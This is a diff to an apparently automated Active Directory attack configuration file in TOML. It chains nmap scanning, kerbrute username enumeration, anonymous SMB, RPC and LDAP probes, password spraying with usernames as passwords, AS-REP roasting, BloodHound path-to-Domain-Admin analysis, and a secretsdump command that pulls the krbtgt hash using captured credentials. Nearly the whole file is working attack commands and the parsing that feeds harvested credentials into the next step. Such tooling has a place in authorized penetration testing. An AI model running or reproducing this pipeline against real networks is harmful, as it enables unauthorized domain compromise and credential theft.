@@ -3,14 +3,14 @@ name = "nmap"
 run_once = true
 cmd = "nmap -v -sVC -oA {output_dir}nmap -Pn {ip}"
 
-  [[START.patterns]]
-  "Discovered open port (445|139)" = [
+  [[START.events]]
+  "Discovered open port (445|139)/" = [
     "SMB SERVICE FOUND",
     "RPC SERVICE FOUND"
   ]
 
-  [[START.patterns]]
-  "Discovered open port (389)" = [
+  [[START.events]]
+  "Discovered open port (389)/" = [
     "LDAP SERVICE FOUND"
   ]
 
@@ -21,7 +21,7 @@ cmd = """kerbrute userenum --dc {ip} -d {domain_name} {potential_usernames_file}
   [[START.append_array]]
   "usernames" = '''\[\+\] VALID USERNAME:\s*(.*)\x1b'''
 
-  [[START.patterns]]
+  [[START.events]]
   "VALID USERNAME" = [
     "VALID USERNAME FOUND"
   ]
@@ -32,7 +32,7 @@ name = "smbclient-anonymous"
 run_once = true
 cmd = "smbclient -U ''%'' \\\\\\\\{ip}\\\\IPC$ -c 'AZERTY;q'"
 
-  [["SMB SERVICE FOUND".patterns]]
+  [["SMB SERVICE FOUND".events]]
   "AZERTY: command not found" = [
     "SMB ANONYMOUS ACCESS ALLOWED"
   ]
@@ -50,7 +50,7 @@ cmd = "ldapsearch -LLL -x -h {ip} -s base"
   [["LDAP SERVICE FOUND".store]]
   domain_dn = "rootDomainNamingContext: (.*?)$"
 
-  [["LDAP SERVICE FOUND".patterns]]
+  [["LDAP SERVICE FOUND".events]]
   "rootDomainNamingContext: DC=.*$" = [
     "TARGET IS A DOMAIN CONTROLLER"
   ]
@@ -69,7 +69,7 @@ fi"""
   [["TARGET IS A DOMAIN CONTROLLER".store_static]]
   ldap_dc_output_file = "{output_dir}ldap-anonymous-dc.txt"
 
-  [["TARGET IS A DOMAIN CONTROLLER".patterns]]
+  [["TARGET IS A DOMAIN CONTROLLER".events]]
   "SUCCESS" = [
     "LDAP ANONYMOUS ACCESS TO DC"
   ]
@@ -86,9 +86,9 @@ cat {output_dir}ldap_users.lst;
 && echo '###USERS FOUND'"""
 
   [["LDAP ANONYMOUS ACCESS TO DC".append_array]]
-  usernames = "^((?!###USERS).*)$" 
+  usernames = "^((?!###USERS).*)$"
   
-  [["LDAP ANONYMOUS ACCESS TO DC".patterns]]
+  [["LDAP ANONYMOUS ACCESS TO DC".events]]
   "USERS FOUND" = [
     "VALID USERNAME FOUND"
   ]
@@ -98,7 +98,7 @@ name = "rpc-anonymous"
 run_once = true
 cmd = "rpcclient -U ''%'' {ip} -c 'AZERTY;quit' 2>/dev/null"
 
-  [["RPC SERVICE FOUND".patterns]]
+  [["RPC SERVICE FOUND".events]]
   "command not found: AZERTY" = [
     "RPC ANONYMOUS ACCESS ALLOWED"
   ]
@@ -117,14 +117,13 @@ cat {output_dir}rpc_users.lst;
   [["RPC ANONYMOUS ACCESS ALLOWED".append_array]]
   usernames = "^(?!USERS FOUND|RESULT WAS NT_STATUS_ACCESS_DENIED|result was NT_STATUS_ACCESS_DENIED|mkdir failed on directory| Unable to initialize)(.*)$" 
 
-  [["RPC ANONYMOUS ACCESS ALLOWED".patterns]]
+  [["RPC ANONYMOUS ACCESS ALLOWED".events]]
   "USERS FOUND" = [
     "VALID USERNAME FOUND"
   ]
 
 [["VALID USERNAME FOUND"]]
 name = "kerbrute-test-user-as-pass"
-run_once = true
 cmd = """lockfile-create --lock-name {output_dir}kerbrute.lock;
 python3 -c "a={usernames}; print('\\n'.join(a))" > {output_dir}usernames.tmp \
 && sort -u {output_dir}usernames.tmp -f {output_dir}usernames.tmp;
@@ -139,16 +138,20 @@ cat {output_dir}usernames_to_validate.tmp >> {output_dir}usernames_validated.tmp
 kerbrute passwordspray --user-as-pass --dc {ip} -d {domain_name} {output_dir}usernames_to_validate.tmp;
 lockfile-remove --lock-name {output_dir}kerbrute.lock;"""
 
-  [["VALID USERNAME FOUND".append_array]]
-  "credentials" = '''\[\+\] VALID LOGIN:\s*(.*)\x1b'''
+  [["VALID USERNAME FOUND".append_dict_array]]
+    ["VALID USERNAME FOUND".append_dict_array.credentials]
+    username = '''\[\+\] VALID LOGIN:\s*(.+)@.+:.*\x1b'''
+    domain = '''\[\+\] VALID LOGIN:\s*.+@(.+):.*\x1b'''
+    password = '''\[\+\] VALID LOGIN:\s*.+@.+:(.*)\x1b'''
 
-  [["VALID USERNAME FOUND".patterns]]
+  [["VALID USERNAME FOUND".events]]
   "VALID LOGIN" = [
     "VALID CREDENTIALS FOUND"
   ]
 
 [["VALID USERNAME FOUND"]]
 name = "asreproast"
+run_once = true
 cmd = """
 lockfile-create --lock-name {output_dir}asreproast.lock;
 python3 -c "a={usernames}; print('\\n'.join(x.split('@')[0] for x in a))" > {output_dir}asrep_users.tmp \
@@ -168,60 +171,68 @@ lockfile-remove --lock-name {output_dir}asreproast.lock;
   [["VALID USERNAME FOUND".store_static]]
   asreproast_hashes = "{output_dir}asreproast.hash"
 
-  [["VALID USERNAME FOUND".patterns]]
+  [["VALID USERNAME FOUND".events]]
   "TGT FOUND" = [
     "TGT HASH FOUND"
   ]
 
 [["VALID CREDENTIALS FOUND"]]
-name = "first-valid-creds"
-run_once = true
-cmd = '''python3 -c "a={credentials}; u,p=a[0].split(':'); print(f'USERNAME: {{u}}'); print(f'PASSWORD: {{p}}')";'''
-
-  [["VALID CREDENTIALS FOUND".store]]
-  user_default = '''^USERNAME: (.*?)$'''
-
-  [["VALID CREDENTIALS FOUND".store]]
-  password_default = '''^PASSWORD: (.*?)$'''
-
-[["VALID CREDENTIALS FOUND"]]
 name = "bloodhound-gather-info"
-cmd = "cd {output_dir}; mkdir -p bloodhound; cd bloodhound; python3 -m bloodhound -u {user_default} -p {password_default} -d {domain_name} -dc {dc_dns} -ns {ip} -c all"
+cmd = "cd {output_dir}; mkdir -p bloodhound; cd bloodhound; python3 -m bloodhound -u {credentials[0][username]} -p {credentials[0][password]} -d {domain_name} -dc {dc_dns} -ns {ip} -c all"
 run_once = true
 
   [["VALID CREDENTIALS FOUND".store]]
   bloodhound_gathered = "INFO: Done"
 
-  [["VALID CREDENTIALS FOUND".patterns]]
+  [["VALID CREDENTIALS FOUND".events]]
   "INFO: Done" = [
     "BLOODHOUND GATHERED"
   ]
 
-[["VALID CREDENTIALS FOUND"]]
-name = "bloodhound-add-owned-users"
-cmd = """echo {bloodhound_imported}; python3 -c "a={credentials}; print('\\n'.join(a))" | cut -d'@' -f1 | cut -d':' -f1 > {output_dir}owned_users.lst \
-&& sort -u {output_dir}owned_users.lst -f {output_dir}owned_users.lst;
-python3 ~/programs/bloodhound/bloodhound_manager.py set user-owned -l {output_dir}owned_users.lst -d {domain_name};"""
-iterate_over = "credentials"
+[["BLOODHOUND GATHERED"]]
+name = "bloodhound-import"
+cmd = "bloodhound-import -du neo4j -dp bloodhound {output_dir}bloodhound/*"
+run_once = true
 
-  [["VALID CREDENTIALS FOUND".patterns]]
-  "Done$" = [
+  [["BLOODHOUND GATHERED".events]]
+  " - Done" = [
+    "BLOODHOUND IMPORTED"
+  ]
+
+[["BLOODHOUND IMPORTED"]]
+name = "bloodhound-add-owned-users"
+iterate_over = "credentials"
+cmd = """python3 {bloodhound_manager} set user-owned -u {array_element[username]} -d {domain_name};"""
+
+  [["BLOODHOUND IMPORTED".events]]
+  "successfully set as owned in BloodHound" = [
     "OWNED USERS ADDED"
+  ]
+
+[["OWNED USERS ADDED"]]
+name = "bloodhound-check-shortest-path"
+cmd = "python3 {bloodhound_manager} get path-to-da-from-owned"
+
+  [["OWNED USERS ADDED".events]]
+  'Path to DA found from owned users'  = [
+    "PATH TO DA FOUND"
   ]
 
 [["VALID CREDENTIALS FOUND"]]
 name = "kerberoast"
 cmd = ""
 
-  [["VALID CREDENTIALS FOUND".patterns]]
+  [["VALID CREDENTIALS FOUND".events]]
   "okok" = [
     "TGS HASH FOUND"
   ]
 
+
 [["VALID CREDENTIALS FOUND"]]
 name = "extract-ldap-users-authenticated"
+run_once = true
 cmd = """
-ldapsearch -LLL -x -h {ip} -D "{user_default}@{domain_name}" -w {password_default} -b '{domain_dn}' "(objectClass=User)" sAMAccountName \
+ldapsearch -LLL -x -h {ip} -D "{credentials[0][username]}" -w {credentials[0][password]} -b '{domain_dn}' "(objectClass=User)" sAMAccountName \
 | grep "sAMAccountName:" \
 | cut -d" " -f2 > {output_dir}ldap_users.lst;
 cat {output_dir}ldap_users.lst;
@@ -229,31 +240,24 @@ cat {output_dir}ldap_users.lst;
 && echo '###USERS FOUND'"""
 
   [["VALID CREDENTIALS FOUND".append_array]]
-  usernames = "^((?!###USERS).*)$" 
+  usernames = "^((?!###USERS).*)$"
   
-  [["VALID CREDENTIALS FOUND".patterns]]
+  [["VALID CREDENTIALS FOUND".events]]
   "USERS FOUND" = [
     "VALID USERNAME FOUND"
   ]
 
-
-[["BLOODHOUND GATHERED"]]
-name = "bloodhound-import"
-cmd = "bloodhound-import -du neo4j -dp Bloodhound {output_dir}bloodhound/*"
-run_once = true
-
-  [["BLOODHOUND GATHERED".store]]
-  bloodhound_imported = "Done"
-
-[["OWNED USERS ADDED"]]
-name = "bloodhound-check-shortest-path"
-cmd = "echo {bloodhound_imported}; python3 ~/programs/bloodhound/bloodhound_manager.py get path-to-da-owned-users"
+[["VALID CREDENTIALS FOUND"]]
+name = "check-domain-admin"
 iterate_over = "credentials"
+cmd = "secretsdump.py {array_element[domain]}/{array_element[username]}:{array_element[password]}@{dc_dns} -just-dc-user krbtgt"
 
-  [["OWNED USERS ADDED".patterns]]
-  'Path to DA found for user'  = [
+  [["VALID CREDENTIALS FOUND".events]]
+  "krbtgt:502:" = [
     "PATH TO DA FOUND"
   ]
+
+
 
 
 [[LISTENERS]]
@@ -264,7 +268,7 @@ listener = true
   [[LISTENERS.append_array]]
   "credentials" = '(.*)'
 
-  [[LISTENERS.patterns]]
+  [[LISTENERS.events]]
   "(.*)" = [
     "VALID CREDENTIALS FOUND"
   ]
